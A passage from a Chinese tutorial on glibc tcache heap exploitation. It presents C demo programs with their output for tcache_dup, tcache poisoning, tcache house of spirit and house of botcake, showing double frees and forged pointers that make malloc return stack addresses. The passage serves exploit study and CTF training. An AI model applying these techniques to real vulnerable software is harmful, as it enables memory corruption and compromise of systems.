  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK <MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)

/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

int main()
{
    unsigned long long req;
    unsigned long long tidx;
    fprintf(stderr,"This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\n");
    fprintf(stderr,"The basic formula is as follows:\n");
    fprintf(stderr,"\t(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\n");
    fprintf(stderr,"\tOn a 64 bit system the current values are:\n");
    fprintf(stderr,"\t\tMINSIZE: 0x%lx\n", MINSIZE);
    fprintf(stderr,"\t\tMALLOC_ALIGNMENT: 0x%lx\n", MALLOC_ALIGNMENT);
    fprintf(stderr,"\tSo we get the following equation:\n");
    fprintf(stderr,"\t(IDX = CHUNKSIZE - 0x%lx) / 0x%lx\n\n", MINSIZE-MALLOC_ALIGNMENT+1, MALLOC_ALIGNMENT);
    fprintf(stderr,"BUT be AWARE that CHUNKSIZE is not the x in malloc(x)\n");
    fprintf(stderr,"It is calculated as follows:\n");
    fprintf(stderr,"\tIF x <MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)\n", MINSIZE, MINSIZE);
    fprintf(stderr,"\tELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) \n");
    fprintf(stderr,"\t=> CHUNKSIZE = (x + 0x%lx + 0x%lx) & ~0x%lx)\n\n\n", SIZE_SZ, MALLOC_ALIGN_MASK, MALLOC_ALIGN_MASK);
    while(1) {
        fprintf(stderr,"[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): ");
        scanf("%llx", &req);
        tidx = usize2tidx(req);
        if (tidx> 63) {
            fprintf(stderr,"\nWARNING: NOT IN TCACHE RANGE!\n");
        }
        fprintf(stderr,"\nTCache Idx: %llu\n", tidx);
    }
    return 0;
}
```

输出：

```
This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.
The basic formula is as follows:
    (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
    On a 64 bit system the current values are:
        MINSIZE: 0x20
        MALLOC_ALIGNMENT: 0x10
    So we get the following equation:
    (IDX = CHUNKSIZE - 0x11) / 0x10

BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
It is calculated as follows:
    IF x <MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
    ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
    => CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf)


[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10

TCache Idx: 0
```

关于 tcache 介绍可以参考 [这里](http://tukan.farm/2017/07/08/tcache/)。

这个例子说明了 tcache 的索引是如何分配的，需要注意的是 `CHUNKSIZE` 是经过 `request2size` 转化后的大小，也就是 chunk 的实际大小。tcache 索引 `IDX` 可以由上面的公式得到。

## tcache_dup

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr,"This file demonstrates a simple double-free attack with tcache.\n");

    fprintf(stderr,"Allocating buffer.\n");
    int *a = malloc(8);

    fprintf(stderr,"malloc(8): %p\n", a);
    fprintf(stderr,"Freeing twice...\n");
    free(a);
    free(a);

    fprintf(stderr,"Now the free list has [%p, %p].\n", a, a);
    fprintf(stderr,"Next allocated buffers will be same: [%p, %p].\n", malloc(8), malloc(8));

    return 0;
}
```

输出：

```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x1a90260
Freeing twice...
Now the free list has [0x1a90260, 0x1a90260].
Next allocated buffers will be same: [0x1a90260, 0x1a90260].
```

和 fastbin 类似，tcache 也存在 double free，而且还没有链表头检查，因此只需要连续两次 free 就好了，更加简单。

## tcache_poisoning

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    fprintf(stderr,"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
           "returning a pointer to an arbitrary location (in this case, the stack).\n"
           "The attack is very similar to fastbin corruption attack.\n\n");

    size_t stack_var;
    fprintf(stderr,"The address we want malloc() to return is %p.\n", (char *)&stack_var);

    fprintf(stderr,"Allocating 1 buffer.\n");
    intptr_t *a = malloc(128);
    fprintf(stderr,"malloc(128): %p\n", a);
    fprintf(stderr,"Freeing the buffer...\n");
    free(a);

    fprintf(stderr,"Now the tcache list has [%p].\n", a);
    fprintf(stderr,"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
        "to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
    a[0] = (intptr_t)&stack_var;

    fprintf(stderr,"1st malloc(128): %p\n", malloc(128));
    fprintf(stderr,"Now the tcache list has [%p].\n", &stack_var);

    intptr_t *b = malloc(128);
    fprintf(stderr,"2nd malloc(128): %p\n", b);
    fprintf(stderr,"We got the control\n");

    return 0;
}
```

输出：

```
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7ffd4941b420.
Allocating 1 buffer.
malloc(128): 0x1601260
Freeing the buffer...
Now the tcache list has [0x1601260].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260
to point to the location to control (0x7ffd4941b420).
1st malloc(128): 0x1601260
Now the tcache list has [0x7ffd4941b420].
2nd malloc(128): 0x7ffd4941b420
We got the control
```

和 `fastbin_dup_into_stack` 类似，改写已经 `free` 掉的 chunk 的 `fd` 指向栈上地址，然后 `malloc` 两次即可分配到栈上。

## tcache_house_of_spirit

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr,"This file demonstrates the house of spirit attack on tcache.\n");
    fprintf(stderr,"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
    fprintf(stderr,"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
    fprintf(stderr,"(Search for strings \"invalid next size\"and \"double free or corruption\")\n\n");

    fprintf(stderr,"Ok. Let's start with the example!.\n\n");


    fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr,"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
    unsigned long long *a; //pointer that will be overwritten
    unsigned long long fake_chunks[10]; //fake chunk region

    fprintf(stderr,"This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

    fprintf(stderr,"This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size


    fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

    a = &fake_chunks[2];

    fprintf(stderr,"Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
}
```

输出：

```
This file demonstrates the house of spirit attack on tcache.
It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.
You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.
(Search for strings"invalid next size"and"double free or corruption")

Ok. Let's start with the example!.

Calling malloc() once so that it sets up its memory.
Let's imagine we will overwrite 1 pointer to point to a fake chunk region.
This region contains one fake chunk. It's size field is placed at 0x7ffe46748fb8
This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0!
malloc(0x30): 0x7ffe46748fc0
```

依然非常简单。相比传统 house of spirit，tcache 中不会检查被释放的 chunk 的下一个 chunk 的 `chunk_size` 字段。那么我们只要保证 fake chunk 本身的大小合法（实际上就是位于 small bin 范围内）就可以了。随后将 fake chunk 的 `mem` 指针赋值给 `a`，`free(a)` 就将 fake chunk 放进了 tcache，再次 `malloc` 即可拿到 fake chunk。

## house_of_botcake

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     */

    // disable buffering and make _FILE_IO does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a);
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);

    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);

    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);

    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;

    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);

    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");

    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
```

输出：

```
This file demonstrates a powerful tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this demo, the stack).
This attack only relies on double free.

The address we want malloc() to return, namely,
the target address is 0x7ffd2845e850.

Preparing heap layout
Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.
Allocating a chunk for later consolidation
Allocating the victim chunk.
malloc(0x100): a=0xcffae0.
Allocating a padding to prevent consolidation.

Now we are able to cause chunk overlapping
Step 1: fill up tcache list
Step 2: free the victim chunk so it will be added to unsorted bin
Step 3: free the previous chunk and make it consolidate with the victim chunk.
Step 4: add the victim chunk to tcache list by taking one out from it and free victim again

Launch tcache poisoning
Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk
We simply overwrite victim's fwd pointer
Now we can cash out the target chunk.
The new chunk is at 0x7ffd2845e850
Got control on target/stack!

Note:
And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
In that case, once you have done this exploitation, you can have many arbitary writes very easily.
```

首先用 7 个 0x100 的 chunk 填满 tcache，再次申请 0x100 的 chunk `a` 并释放就只能进入 unsorted bin。如果它上一个 chunk 同样是 0x100 并且也被释放，那么它们就会合并。

现在从 tcache 中取出一个 chunk，然后 double free 掉 `a`，`a` 就进入了 tcache。然后我们申请一个大于 0x100 的 chunk 使得 tcache 无法满足申请，从而从 unsorted bin 中取出刚才合并好的 chunk，构成堆块重叠，修改 `a` 的 `fd` 为栈上地址，`malloc` 两次即可分配到栈上。